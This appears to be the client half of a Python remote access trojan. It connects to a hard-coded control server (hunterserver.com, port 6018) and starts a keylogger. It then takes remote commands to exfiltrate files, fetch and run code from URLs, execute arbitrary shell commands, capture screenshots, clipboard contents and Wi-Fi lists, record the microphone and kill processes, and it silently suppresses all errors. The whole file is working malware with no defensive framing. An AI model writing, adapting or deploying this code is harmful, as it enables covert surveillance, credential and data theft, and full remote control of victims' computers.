import socket, os
from client_commands import *
from keylogger import Keylogger

def run(host, port):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client_socket.connect((host, port))
        except:
            return
        
        klogger = Keylogger()
        while True:
            command = client_socket.recv()
            if command == "exit":
                break
            elif command == "pwd":
                pwd(client_socket)
            elif command[:2] == "cd":
                try:
                    os.chdir(command[3:])
                except:
                    continue
            elif command == "sysinfo":
                handle_sysinfo_command(client_socket)
            elif command[:8] == "download":
                downloaded_data = send_file_to_server(client_socket, command[9:])
                if downloaded_data.startswith("[!] Error"):
                    continue
            elif command[:6] == "upload":
                uploaded_data = upload(client_socket, command[7:])
                if uploaded_data.startswith("[!] Error"):
                    continue
            elif command == "netstat":
                execute_netstat(client_socket)
            elif command[:4] == "kill":
                kill_process(client_socket, command[5:])
            elif command == "cpl":
                check_admin_privileges(client_socket)
            elif command[:6] == "urldwn":
                downloaded_data = urldownload(client_socket, command[7:])
                if downloaded_data.startswith("[!] Error"):
                    continue
            elif command[:3] == "run":
                execute_program(client_socket, command[4:])
            elif command[:7] == "prt_scr":
                take_screenshot(client_socket)
            elif command == "wifi_lst":
                get_wifi_list(client_socket)
            elif command == "clipboard":
                send_clipboard(client_socket)
            elif command[:21] == "mic_record --duration":
                mic_record(client_socket, command)
            else:  # * Run Other System Commands
                execute_system_command(client_socket, command)
    except:
        return


if "__main__" == __name__:
    run(host="hunterserver.com", port=6018)
